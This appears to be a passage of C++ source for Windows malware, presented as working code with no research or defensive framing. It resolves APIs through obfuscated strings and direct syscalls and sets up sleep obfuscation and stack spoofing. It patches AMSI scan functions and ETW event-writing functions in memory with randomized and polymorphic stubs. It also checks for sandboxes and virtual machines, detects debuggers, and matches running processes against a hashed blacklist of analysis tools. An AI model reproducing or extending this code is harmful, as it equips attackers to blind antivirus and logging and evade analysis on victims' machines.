        _RegOpenKeyExA = (Resolver::RegOpenKeyExA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegOpenKeyExA").c_str());
        _RegQueryValueExA = (Resolver::RegQueryValueExA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegQueryValueExA").c_str());
        _RegCloseKey = (Resolver::RegCloseKey_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegCloseKey").c_str());
        _OpenProcessToken = (Resolver::OpenProcessToken_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("OpenProcessToken").c_str());
        _GetTokenInformation = (Resolver::GetTokenInformation_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("GetTokenInformation").c_str());
        _GetForegroundWindow = (Resolver::GetForegroundWindow_t)ResolveViaGPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetForegroundWindow").c_str());
        _GetWindowTextA = (Resolver::GetWindowTextA_t)ResolveViaGPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetWindowTextA").c_str());
        _GetLastInputInfo = (Resolver::GetLastInputInfo_t)ResolveViaGPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetLastInputInfo").c_str());
        _EnumDisplayDevicesA = (Resolver::EnumDisplayDevicesA_t)ResolveViaGPA(OBFS_S("user32.dll").c_str(), OBFS_S("EnumDisplayDevicesA").c_str());
        _WSAStartup = (Resolver::WSAStartup_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("WSAStartup").c_str());
        _WSACleanup = (Resolver::WSACleanup_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("WSACleanup").c_str());
        _socket = (Resolver::socket_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("socket").c_str());
        _connect = (Resolver::connect_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("connect").c_str());
        _send = (Resolver::send_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("send").c_str());
        _recv = (Resolver::recv_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("recv").c_str());
        _closesocket = (Resolver::closesocket_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("closesocket").c_str());
        _getaddrinfo = (Resolver::getaddrinfo_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("getaddrinfo").c_str());
        _freeaddrinfo = (Resolver::freeaddrinfo_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("freeaddrinfo").c_str());
        _setsockopt = (Resolver::setsockopt_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("setsockopt").c_str());
        _InternetOpenA = (Resolver::InternetOpenA_t)ResolveViaGPA(OBFS_S("wininet.dll").c_str(), OBFS_S("InternetOpenA").c_str());
        _InternetOpenUrlA = (Resolver::InternetOpenUrlA_t)ResolveViaGPA(OBFS_S("wininet.dll").c_str(), OBFS_S("InternetOpenUrlA").c_str());
        _InternetReadFile = (Resolver::InternetReadFile_t)ResolveViaGPA(OBFS_S("wininet.dll").c_str(), OBFS_S("InternetReadFile").c_str());
        _InternetCloseHandle = (Resolver::InternetCloseHandle_t)ResolveViaGPA(OBFS_S("wininet.dll").c_str(), OBFS_S("InternetCloseHandle").c_str());
        _CryptStringToBinaryA = (Resolver::CryptStringToBinaryA_t)ResolveViaGPA(OBFS_S("crypt32.dll").c_str(), OBFS_S("CryptStringToBinaryA").c_str());
        _BCryptOpenAlgorithmProvider = (Resolver::BCryptOpenAlgorithmProvider_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptOpenAlgorithmProvider").c_str());
        _BCryptGetProperty = (Resolver::BCryptGetProperty_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptGetProperty").c_str());
        _BCryptCreateHash = (Resolver::BCryptCreateHash_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptCreateHash").c_str());
        _BCryptHashData = (Resolver::BCryptHashData_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptHashData").c_str());
        _BCryptFinishHash = (Resolver::BCryptFinishHash_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptFinishHash").c_str());
        _BCryptDestroyHash = (Resolver::BCryptDestroyHash_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptDestroyHash").c_str());
        _BCryptCloseAlgorithmProvider = (Resolver::BCryptCloseAlgorithmProvider_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptCloseAlgorithmProvider").c_str());
        _BCryptGenRandom = (Resolver::BCryptGenRandom_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptGenRandom").c_str());
        _BCryptSetProperty = (Resolver::BCryptSetProperty_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptSetProperty").c_str());
        _BCryptGenerateSymmetricKey = (Resolver::BCryptGenerateSymmetricKey_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptGenerateSymmetricKey").c_str());
        _BCryptEncrypt = (Resolver::BCryptEncrypt_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptEncrypt").c_str());
        _BCryptDecrypt = (Resolver::BCryptDecrypt_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptDecrypt").c_str());
        _BCryptDestroyKey = (Resolver::BCryptDestroyKey_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptDestroyKey").c_str());
        _CoInitializeEx = (Resolver::CoInitializeEx_t)ResolveViaGPA(OBFS_S("ole32.dll").c_str(), OBFS_S("CoInitializeEx").c_str());
        _CoInitializeSecurity = (Resolver::CoInitializeSecurity_t)ResolveViaGPA(OBFS_S("ole32.dll").c_str(), OBFS_S("CoInitializeSecurity").c_str());
        _CoCreateInstance = (Resolver::CoCreateInstance_t)ResolveViaGPA(OBFS_S("ole32.dll").c_str(), OBFS_S("CoCreateInstance").c_str());
        _CoUninitialize = (Resolver::CoUninitialize_t)ResolveViaGPA(OBFS_S("ole32.dll").c_str(), OBFS_S("CoUninitialize").c_str());
        _VariantClear = (Resolver::VariantClear_t)ResolveViaGPA(OBFS_S("oleaut32.dll").c_str(), OBFS_S("VariantClear").c_str());
        _capGetDriverDescriptionA = (Resolver::capGetDriverDescriptionA_t)ResolveViaGPA(OBFS_S("vfw32.dll").c_str(), OBFS_S("capGetDriverDescriptionA").c_str());
        _IsUserAnAdmin = (Resolver::IsUserAnAdmin_t)ResolveViaGPA(OBFS_S("shell32.dll").c_str(), OBFS_S("IsUserAnAdmin").c_str());
        SLOG("[INTERNAL] All API pointers resolved, initializing stealth subsystems...");
        SLOG("[INTERNAL] Calling SleepObf::Init()...");
        bool sleepOk = SleepObf::Init();
        SLOG("[INTERNAL] SleepObf::Init() = %s", sleepOk ? "OK" : "FAILED (non-fatal)");
        SLOG("[INTERNAL] Calling StackSpoof::Init()...");
        bool spoofOk = StackSpoof::Init();
        SLOG("[INTERNAL] StackSpoof::Init() = %s", spoofOk ? "OK" : "FAILED (non-fatal)");
        SLOG("[INTERNAL] Initialize() completed OK");
        return true;
    }
    NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
    {
        return Syscalls::NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    }
    NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
    {
        return Syscalls::NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
    }
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
    {
        return Syscalls::NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
    }
    NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG FreeType)
    {
        return Syscalls::NtFreeVirtualMemory(ProcessHandle, BaseAddress, RegionSize, FreeType);
    }
    NTSTATUS NtClose(HANDLE Handle) {
        return Syscalls::NtClose(Handle);
    }
    NTSTATUS NtQueryInformationProcess(HANDLE ProcessHandle,
        ULONG ProcessInformationClass, PVOID ProcessInformation,
        ULONG ProcessInformationLength, PULONG ReturnLength)
    {
        return Syscalls::NtQueryInformationProcess(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
    }
    NTSTATUS NtSetInformationThread(HANDLE ThreadHandle,
        ULONG ThreadInformationClass, PVOID ThreadInformation,
        ULONG ThreadInformationLength)
    {
        return Syscalls::NtSetInformationThread(ThreadHandle, ThreadInformationClass, ThreadInformation, ThreadInformationLength);
    }
    NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine,
        PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits,
        SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList)
    {
        return Syscalls::NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
    }
    NTSTATUS NtDelayExecution(BOOLEAN Alertable, LONGLONG* DelayInterval) {
        return Syscalls::NtDelayExecution(Alertable, DelayInterval);
    }
    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead)
    {
        return Syscalls::NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);
    }
    NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, PVOID ClientId)
    {
        return Syscalls::NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    }
    NTSTATUS NtQuerySystemInformation(ULONG SystemInformationClass,
        PVOID SystemInformation, ULONG SystemInformationLength,
        PULONG ReturnLength)
    {
        return Syscalls::NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    }
    NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
        PLARGE_INTEGER Timeout)
    {
        return Syscalls::NtWaitForSingleObject(Handle, Alertable, Timeout);
    }
    void SleepMs(DWORD milliseconds) {
        Syscalls::SleepMs(milliseconds);
    }
}

#include <windows.h>
static bool SyscallProtect(PVOID address, SIZE_T size, ULONG newProtect, PULONG oldProtect) {
    PVOID base = address;
    SIZE_T sz  = size;
    SLOG("[BYPASS] SyscallProtect: addr=%p size=%zu prot=0x%X", address, size, newProtect);
    NTSTATUS status = Syscalls::NtProtectVirtualMemory(
        (HANDLE)-1, &base, &sz, newProtect, oldProtect);
    SLOG("[BYPASS] SyscallProtect result: 0x%X (base=%p sz=%zu oldProt=0x%X)", status, base, sz, *oldProtect);
    if (status == 0 && *oldProtect != 0) {
        return true;
    }
    SLOG("[BYPASS] Syscall suspect, trying VirtualProtect fallback");
    if (Internal::_VirtualProtect) {
        DWORD dwOld = 0;
        if (Internal::_VirtualProtect(address, size, newProtect, &dwOld)) {
            *oldProtect = dwOld;
            SLOG("[BYPASS] VirtualProtect fallback OK (oldProt=0x%X)", dwOld);
            return true;
        }
    }
    SLOG("[BYPASS] All protection methods FAILED");
    return false;
}

static bool SafeWriteBytes(void* dst, const void* src, size_t len) {
    __try {
        volatile unsigned char* test = (volatile unsigned char*)dst;
        unsigned char orig = *test;
        *test = orig; 
        SLOG("[BYPASS] Test write OK at %p", dst);

        volatile unsigned char* d = (volatile unsigned char*)dst;
        const unsigned char* s = (const unsigned char*)src;
        for (size_t i = 0; i < len; i++) d[i] = s[i];
        SLOG("[BYPASS] SecureCopy(%p, %zu bytes) OK", dst, len);
        return true;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        SLOG("[BYPASS] EXCEPTION writing to %p! Code=0x%08X", dst, GetExceptionCode());
        return false;
    }
}

static void BuildAmsiPatch(unsigned char* patch, size_t* patchSize) {

    DWORD randErr = 0;
    Internal::SecureRand(1); 
    WORD lo = (WORD)(Internal::SecureRand(0xFFFE) + 1); 
    randErr = 0x80070000UL | lo;  

#ifdef _WIN64
    patch[0] = 0xB8; 
    patch[1] = (unsigned char)(randErr & 0xFF);
    patch[2] = (unsigned char)((randErr >> 8) & 0xFF);
    patch[3] = (unsigned char)((randErr >> 16) & 0xFF);
    patch[4] = (unsigned char)((randErr >> 24) & 0xFF);
    patch[5] = 0xC3; 
    *patchSize = 6;
#else
    patch[0] = 0xB8; 
    patch[1] = (unsigned char)(randErr & 0xFF);
    patch[2] = (unsigned char)((randErr >> 8) & 0xFF);
    patch[3] = (unsigned char)((randErr >> 16) & 0xFF);
    patch[4] = (unsigned char)((randErr >> 24) & 0xFF);

    patch[5] = 0xC2;
    patch[6] = 0x18;
    patch[7] = 0x00;
    *patchSize = 8;
#endif
}

static void BuildAmsiScanStringPatch(unsigned char* patch, size_t* patchSize) {
    DWORD randErr = 0x80070000UL | (WORD)(Internal::SecureRand(0xFFFE) + 1);

#ifdef _WIN64
    patch[0] = 0xB8;
    patch[1] = (unsigned char)(randErr & 0xFF);
    patch[2] = (unsigned char)((randErr >> 8) & 0xFF);
    patch[3] = (unsigned char)((randErr >> 16) & 0xFF);
    patch[4] = (unsigned char)((randErr >> 24) & 0xFF);
    patch[5] = 0xC3;
    *patchSize = 6;
#else
    patch[0] = 0xB8;
    patch[1] = (unsigned char)(randErr & 0xFF);
    patch[2] = (unsigned char)((randErr >> 8) & 0xFF);
    patch[3] = (unsigned char)((randErr >> 16) & 0xFF);
    patch[4] = (unsigned char)((randErr >> 24) & 0xFF);

    patch[5] = 0xC2;
    patch[6] = 0x08;
    patch[7] = 0x00;
    *patchSize = 8;
#endif
}

static void BuildEtwPatch(unsigned char* patch, size_t maxSize, size_t* patchSize) {
    size_t pos = 0;

    if (Polymorph::FastRandRange(100) < 65) {
        size_t junkLen = 0;
        size_t maxJunk = (maxSize > 50) ? 15 : 5;
        Polymorph::GenerateJunk(patch + pos, maxJunk, &junkLen);
        pos += junkLen;
    }

    switch (Polymorph::FastRandRange(8)) {
        case 0: 
            patch[pos++] = 0x31; patch[pos++] = 0xC0; break;
        case 1: 
            patch[pos++] = 0x33; patch[pos++] = 0xC0; break;
        case 2: 
            patch[pos++] = 0x29; patch[pos++] = 0xC0; break;
        case 3: 
            patch[pos++] = 0x2B; patch[pos++] = 0xC0; break;
        case 4: 
            patch[pos++] = 0x6A; patch[pos++] = 0x00; patch[pos++] = 0x58; break;
        case 5: 
            patch[pos++] = 0x83; patch[pos++] = 0xE0; patch[pos++] = 0x00; break;
        case 6: { 
            DWORD key = Polymorph::FastRand();
            if (key == 0) key = 0xA3B7C1D5;
            patch[pos++] = 0xB8;
            *(DWORD*)(patch + pos) = key; pos += 4;
            patch[pos++] = 0x35;
            *(DWORD*)(patch + pos) = key; pos += 4;
            break;
        }
        default: { 
            DWORD key = Polymorph::FastRand();
            if (key == 0) key = 0xF2E8D4C6;
            patch[pos++] = 0xB8;
            *(DWORD*)(patch + pos) = key; pos += 4;
            patch[pos++] = 0x2D;
            *(DWORD*)(patch + pos) = key; pos += 4;
            break;
        }
    }

    if (pos + 12 < maxSize && Polymorph::FastRandRange(100) < 40) {
        size_t junkLen = 0;
        Polymorph::GenerateJunk(patch + pos, 8, &junkLen);
        pos += junkLen;
    }

#ifdef _WIN64
    patch[pos++] = 0xC3; 
#else
    patch[pos++] = 0xC2; 
    patch[pos++] = 0x10; 
    patch[pos++] = 0x00;
#endif

    *patchSize = pos;
}

namespace Bypass {
    static void PatchAmsi() {
        SLOG("[BYPASS] PatchAmsi() starting");
        auto amsiDll = OBFS_S("amsi.dll");
        SLOG("[BYPASS] Loading amsi.dll...");
        HMODULE hModule = Internal::_LoadLibraryA(amsiDll.c_str());
        if (!hModule) { SLOG("[BYPASS] amsi.dll not loaded (OK)"); return; }
        SLOG("[BYPASS] amsi.dll loaded at %p", hModule);

        auto scanBuf = OBFS_S("AmsiScanBuffer");
        FARPROC f1 = Internal::_GetProcAddress(hModule, scanBuf.c_str());
        SLOG("[BYPASS] AmsiScanBuffer = %p", f1);
        if (f1) {
            ULONG oldProtect = 0;
            unsigned char patch[8];
            size_t patchSize = 0;
            BuildAmsiPatch(patch, &patchSize);
            if (SyscallProtect((PVOID)f1, patchSize, PAGE_READWRITE, &oldProtect)) {
                SLOG("[BYPASS] oldProtect was 0x%X", oldProtect);
                SLOG("[BYPASS] Writing AmsiScanBuffer patch (%zu bytes, randomized)...", patchSize);
                SafeWriteBytes(f1, patch, patchSize);
                SyscallProtect((PVOID)f1, patchSize, oldProtect, &oldProtect);
                SLOG("[BYPASS] AmsiScanBuffer done");
            }
            SECURE_WIPE_M(patch, sizeof(patch));
        }

        auto scanStr = OBFS_S("AmsiScanString");
        FARPROC f2 = Internal::_GetProcAddress(hModule, scanStr.c_str());
        SLOG("[BYPASS] AmsiScanString = %p", f2);
        if (f2) {
            ULONG oldProtect = 0;
            unsigned char patch[8];
            size_t patchSize = 0;
            BuildAmsiScanStringPatch(patch, &patchSize);
            if (SyscallProtect((PVOID)f2, patchSize, PAGE_READWRITE, &oldProtect)) {
                SLOG("[BYPASS] Writing AmsiScanString patch (%zu bytes, randomized)...", patchSize);
                SafeWriteBytes(f2, patch, patchSize);
                SyscallProtect((PVOID)f2, patchSize, oldProtect, &oldProtect);
                SLOG("[BYPASS] AmsiScanString done");
            }
            SECURE_WIPE_M(patch, sizeof(patch));
        }
        SLOG("[BYPASS] PatchAmsi() completed");
    }

    static void PatchSingleEtw(HMODULE hModule, const char* funcName) {
        FARPROC f = Internal::_GetProcAddress(hModule, funcName);
        SLOG("[BYPASS] %s = %p", funcName, f);
        if (!f) return;

        ULONG oldProtect = 0;
        unsigned char patch[64];
        size_t patchSize = 0;
        BuildEtwPatch(patch, sizeof(patch), &patchSize);

        if (SyscallProtect((PVOID)f, patchSize, PAGE_READWRITE, &oldProtect)) {
            SLOG("[BYPASS] Writing %s polymorphic patch (%zu bytes)...", funcName, patchSize);
            SafeWriteBytes(f, patch, patchSize);
            SyscallProtect((PVOID)f, patchSize, oldProtect, &oldProtect);
            SLOG("[BYPASS] %s done", funcName);
        }
        SECURE_WIPE_M(patch, sizeof(patch));
    }

    static void PatchEtw() {
        SLOG("[BYPASS] PatchEtw() starting");
        auto ntdllObj = OBFS_S("ntdll.dll");
        HMODULE hModule = Internal::_GetModuleHandleA(ntdllObj.c_str());
        if (!hModule) { SLOG("[BYPASS] ntdll.dll not found!"); return; }
        SLOG("[BYPASS] ntdll.dll at %p", hModule);

        auto etw1 = OBFS_S("EtwEventWrite");
        PatchSingleEtw(hModule, etw1.c_str());
        auto etw2 = OBFS_S("EtwEventWriteEx");
        PatchSingleEtw(hModule, etw2.c_str());
        auto etw3 = OBFS_S("EtwEventWriteFull");
        PatchSingleEtw(hModule, etw3.c_str());

        SLOG("[BYPASS] PatchEtw() completed");
    }

    void ExecuteAll() {
        SLOG("[BYPASS] ExecuteAll() starting");
        PatchAmsi();
        PatchEtw();
        SLOG("[BYPASS] ExecuteAll() completed");
    }
}

#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <vector>
#include <string>

#ifndef POLY_SEED
#define POLY_SEED 0
#endif
#define PROC_HASH_KEY ((DWORD)(POLY_SEED ^ 0xCAFEB0BA))
#define PHASH(str) (Resolver::HashString(str) ^ PROC_HASH_KEY)

static const DWORD g_processHashes[] = {
    PHASH("cheatengine"), PHASH("x32dbg"),    PHASH("x64dbg"),
    PHASH("ollydbg"),     PHASH("windbg"),    PHASH("ida"),
    PHASH("ida64"),       PHASH("ghidra"),    PHASH("radare2"),
    PHASH("immunitydbg"), PHASH("dnspy"),     PHASH("softice"),
    PHASH("wireshark"),   PHASH("procmon"),   PHASH("processhacker"),
    PHASH("procexp"),     PHASH("debugger"),  PHASH("vboxservice"),
    PHASH("vboxtray"),    PHASH("vmtoolsd"),  PHASH("vmwaretray"),
    PHASH("vmwareuser"),  PHASH("vgauthservice"), PHASH("vmacthlp"),
    PHASH("prl_tools"),   PHASH("prl_cc"),    PHASH("vmsrvc"),
    PHASH("vmusrvc"),     PHASH("df5serv"),   PHASH("pestudio"),
    PHASH("exeinfope"),   PHASH("lordpe"),    PHASH("peid"),
    PHASH("cff explorer"),PHASH("hiew"),      PHASH("reshacker"),
    PHASH("api monitor"), PHASH("regshot"),   PHASH("fakenet"),
    PHASH("httpdebugger"),PHASH("fiddler"),   PHASH("charles"),
    PHASH("glasswire"),   PHASH("tcpview"),
};
static const int g_processHashCount = sizeof(g_processHashes) / sizeof(g_processHashes[0]);

static __forceinline char InlineLower(char c) {
    return (c >= 'A' && c <= 'Z') ? (c + 32) : c;
}

namespace Modules {
    static bool CheckHardware() {
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        if (DynAPI::GlobalMemStatusEx(&memInfo)) {
            if (memInfo.ullTotalPhys / (1024ULL * 1024 * 1024) < 3) return true;
        }
        SYSTEM_INFO si;
        DynAPI::GetSysInfo(&si);
        if (si.dwNumberOfProcessors <= 2) return true;
        return false;
    }

    static bool CheckUptime() {
        ULONGLONG uptime = DynAPI::GetTickCount() / 1000;
        return (uptime < 120);
    }

    static bool CheckCPUIDHypervisor() {
        int cpuInfo[4] = {};
        __cpuid(cpuInfo, 1);
        return (cpuInfo[2] >> 31) & 1;
    }

    static bool CheckRegistryVM() {

        HKEY hKey;

        OBFS_W_DECL(k1, L"SOFTWARE\\VMware, Inc.\\VMware Tools");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k1, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k1); return true;
        }
        OBFS_W_WIPE(k1);

        OBFS_W_DECL(k2, L"SOFTWARE\\Oracle\\VirtualBox Guest Additions");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k2, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k2); return true;
        }
        OBFS_W_WIPE(k2);

        OBFS_W_DECL(k3, L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k3, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k3); return true;
        }
        OBFS_W_WIPE(k3);

        OBFS_W_DECL(k4, L"SYSTEM\\CurrentControlSet\\Services\\vmci");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k4, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k4); return true;
        }
        OBFS_W_WIPE(k4);

        OBFS_W_DECL(k5, L"SYSTEM\\CurrentControlSet\\Services\\VMwareMouseSyncer");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k5, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k5); return true;
        }
        OBFS_W_WIPE(k5);

        OBFS_W_DECL(k6, L"HARDWARE\\ACPI\\DSDT\\VBOX__");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k6, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k6); return true;
        }
        OBFS_W_WIPE(k6);

        OBFS_W_DECL(k7, L"HARDWARE\\ACPI\\FADT\\VBOX__");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k7, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k7); return true;
        }
        OBFS_W_WIPE(k7);

        OBFS_W_DECL(k8, L"HARDWARE\\ACPI\\RSDT\\VBOX__");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k8, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k8); return true;
        }
        OBFS_W_WIPE(k8);

        return false;
    }

    static bool CheckTiming() {
        unsigned __int64 t1 = __rdtsc();
        volatile int x = 0;
        for (int i = 0; i < 1000000; i++) x += i;
        unsigned __int64 t2 = __rdtsc();

        unsigned __int64 diff = t2 - t1;
        return (diff > 500000000ULL);
    }

    static bool CheckWine() {
        auto ntdllStr = OBFS_S("ntdll.dll");
        HMODULE hNtdll = Internal::_GetModuleHandleA(ntdllStr.c_str());
        if (!hNtdll) return false;
        auto wineFunc = OBFS_S("wine_get_version");
        return (Internal::_GetProcAddress(hNtdll, wineFunc.c_str()) != nullptr);
    }

    static bool CheckSandboxDLLs() {
        if (Internal::_GetModuleHandleA(OBFS_S("SbieDll.dll").c_str()))  return true;
        if (Internal::_GetModuleHandleA(OBFS_S("VBoxHook.dll").c_str())) return true;
        if (Internal::_GetModuleHandleA(OBFS_S("VBoxSF.dll").c_str()))   return true;
        if (Internal::_GetModuleHandleA(OBFS_S("VBoxDisp.dll").c_str())) return true;
        if (Internal::_GetModuleHandleA(OBFS_S("vmcheck.dll").c_str()))  return true;
        if (Internal::_GetModuleHandleA(OBFS_S("wpespy.dll").c_str()))   return true;
        if (Internal::_GetModuleHandleA(OBFS_S("snxhk.dll").c_str()))    return true;
        if (Internal::_GetModuleHandleA(OBFS_S("pstorec.dll").c_str()))  return true;
        if (Internal::_GetModuleHandleA(OBFS_S("avghookx.dll").c_str())) return true;
        if (Internal::_GetModuleHandleA(OBFS_S("avghooka.dll").c_str())) return true;
        if (Internal::_GetModuleHandleA(OBFS_S("guard64.dll").c_str()))  return true;
        if (Internal::_GetModuleHandleA(OBFS_S("sft.dll").c_str()))      return true;
        if (Internal::_GetModuleHandleA(OBFS_S("sbiedll.dll").c_str()))  return true;
        return false;
    }

    static bool CheckDiskSize() {
        ULARGE_INTEGER total = {};
        auto drive = OBFS_S("C:\\");
        if (Internal::_GetDiskFreeSpaceExA)
            Internal::_GetDiskFreeSpaceExA(drive.c_str(), nullptr, &total, nullptr);
        return (total.QuadPart < 60ULL * 1024 * 1024 * 1024);
    }

    bool AntiAnalysis::IsSandbox() {
        JUNK_CODE_SMALL
        if (CheckHardware()) {
            SLOG("[!] Sandbox detected: Low hardware resources.");
            return true;
        }
        if (CheckUptime()) {
            SLOG("[!] Sandbox detected: System uptime too low.");
            return true;
        }
        if (CheckCPUIDHypervisor()) {
            SLOG("[!] Sandbox detected: Hypervisor bit set (CPUID).");
            return true;
        }
        if (CheckRegistryVM()) {
            SLOG("[!] Sandbox detected: VM registry keys found.");
            return true;
        }
        if (CheckSandboxDLLs()) {
            SLOG("[!] Sandbox detected: Sandbox-specific DLLs found in process.");
            return true;
        }
        if (CheckWine()) {
            SLOG("[!] Sandbox detected: Wine environment discovered.");
            return true;
        }
        if (CheckDiskSize()) {
            SLOG("[!] Sandbox detected: Disk size too small.");
            return true;
        }
        return false;
    }

    bool AntiAnalysis::IsDebugger() {
        JUNK_CODE_SMALL

        {
            DWORD_PTR port = 0;
            NTSTATUS st = Internal::NtQueryInformationProcess(
                (HANDLE)-1,  
                7,           
                &port, sizeof(port), nullptr);
            if (st == 0 && port != 0) {
                SLOG("[!] Debugger detected: ProcessDebugPort is non-zero.");
                return true;
            }
        }

        {
            HANDLE debugObj = NULL;
            NTSTATUS st = Internal::NtQueryInformationProcess(
                (HANDLE)-1, 30, &debugObj, sizeof(debugObj), nullptr);
            if (st == 0 && debugObj != NULL) {
                SLOG("[!] Debugger detected: ProcessDebugObjectHandle present.");
                return true;
            }
        }

        if (CheckTiming()) {
            SLOG("[!] Debugger detected: Timing anomaly (single-stepping).");
            return true;
        }

        if (DynAPI::CreateSnapshot && DynAPI::Proc32First && DynAPI::Proc32Next) {
            HANDLE hSnap = DynAPI::CreateSnapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe;
                pe.dwSize = sizeof(pe);
                if (DynAPI::Proc32First(hSnap, &pe)) {
                    do {

                        char name[MAX_PATH];
                        int ni = 0;
                        for (const char* c = pe.szExeFile; *c && ni < MAX_PATH - 1; c++, ni++)
                            name[ni] = InlineLower(*c);
                        name[ni] = 0;

                        if (ni > 4 && name[ni-4] == '.' && name[ni-3] == 'e' &&
                            name[ni-2] == 'x' && name[ni-1] == 'e') {
                            name[ni-4] = 0;
                        }

                        DWORD nameHash = Resolver::HashString(name) ^ PROC_HASH_KEY;
                        for (int i = 0; i < g_processHashCount; i++) {
                            if (nameHash == g_processHashes[i]) {
                                SLOG("[!] Debugger detected: Blacklisted process (hash match).");
                                if (Internal::_CloseHandle) Internal::_CloseHandle(hSnap);
                                else DynAPI::CloseH(hSnap);
                                return true;
                            }
                        }
